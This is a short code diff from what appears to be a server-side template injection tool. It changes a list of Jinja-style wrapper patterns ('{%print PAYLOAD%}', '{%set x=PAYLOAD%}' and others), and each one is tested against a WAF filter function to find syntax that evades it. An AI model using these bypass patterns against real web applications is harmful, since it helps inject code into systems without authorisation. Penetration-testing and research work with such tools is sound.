@@ -39,14 +39,15 @@ def get_outer_pattern(
     """
     outer_payloads = [
         ("{{}}", "{{PAYLOAD}}", True),
+        ("{%print %}", "{%print PAYLOAD%}", True),
         ("{%print()%}", "{%print(PAYLOAD)%}", True),
+        ("{%set x=%}", "{%set x=PAYLOAD%}", False),
         ("{%if()%}{%endif%}", "{%if(PAYLOAD)%}{%endif%}", False),
         (
             "{%for x in ((),)%}x{%endfor%}",
             "{%for x in ((PAYLOAD),)%}x{%endfor%}",
             False,
         ),
-        ("{% set x= %}", "{% set x=PAYLOAD %}", False),
     ]
     for test_payload, outer_pattern, will_print in outer_payloads:
         if waf_func(test_payload):
